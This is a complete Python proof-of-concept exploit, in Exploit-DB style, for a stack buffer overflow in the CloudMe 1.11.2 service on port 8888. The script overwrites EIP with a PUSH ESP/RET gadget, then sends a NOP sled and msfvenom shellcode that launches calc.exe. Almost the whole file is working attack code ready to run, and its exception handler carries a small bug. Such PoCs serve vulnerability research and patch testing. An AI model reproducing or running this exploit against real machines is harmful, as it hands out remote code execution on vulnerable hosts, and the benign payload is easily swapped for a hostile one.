# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload =  b""
payload += b"\xb8\xd4\xa9\x01\x34\xdb\xd9\xd9\x74\x24\xf4\x5e"
payload += b"\x33\xc9\xb1\x3e\x31\x46\x14\x03\x46\x14\x83\xc6"
payload += b"\x04\x36\x5c\xfd\xdc\x34\x9f\xfe\x1c\x58\x29\x1b"
payload += b"\x2d\x58\x4d\x6f\x1e\x68\x05\x3d\x93\x03\x4b\xd6"
payload += b"\x20\x61\x44\xd9\x81\xcf\xb2\xd4\x12\x63\x86\x77"
payload += b"\x91\x79\xdb\x57\xa8\xb2\x2e\x99\xed\xae\xc3\xcb"
payload += b"\xa6\xa5\x76\xfc\xc3\xf3\x4a\x77\x9f\x12\xcb\x64"
payload += b"\x68\x15\xfa\x3a\xe2\x4c\xdc\xbd\x27\xe5\x55\xa6"
payload += b"\x24\xc3\x2c\x5d\x9e\xb8\xae\xb7\xee\x41\x1c\xf6"
payload += b"\xde\xb0\x5c\x3e\xd8\x2a\x2b\x36\x1a\xd7\x2c\x8d"
payload += b"\x60\x03\xb8\x16\xc2\xc0\x1a\xf3\xf2\x05\xfc\x70"
payload += b"\xf8\xe2\x8a\xdf\x1d\xf5\x5f\x54\x19\x7e\x5e\xbb"
payload += b"\xab\xc4\x45\x1f\xf7\x9f\xe4\x06\x5d\x4e\x18\x58"
payload += b"\x3e\x2f\xbc\x12\xd3\x24\xcd\x78\xbe\xbb\x43\x07"
payload += b"\x8c\xbb\x5b\x08\xa1\xd3\x6a\x83\x2e\xa4\x72\x46"
payload += b"\x0b\x5a\x39\xcb\x3a\xf2\xe4\x99\x7e\x9f\x16\x74"
payload += b"\xbc\x99\x94\x7d\x3d\x5e\x84\xf7\x38\x1b\x02\xeb"
payload += b"\x30\x34\xe7\x0b\xe6\x35\x22\x68\x32\x95\xb5\x0e"
payload += b"\x2f\x55\x36\x8d\xc7\xe1\xd2\x42\x7b\x7a\x47\xfa"
payload += b"\x02\x11\x2b\x71\x85\x85\xbc\x18\x01\x09\x2d\xb8"
payload += b"\xe7\xd4\xc9\x5b\xd8\x3b\x4f\x84\x7b\x2e\xeb\xea"
payload += b"\x1e\xc8\x96\xd2\xd1\x18\x77\x22\x22\x76\xb6\x70"
payload += b"\x6c\xb7\x8d\x58\x44\x83\xd9\xac\xa4"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
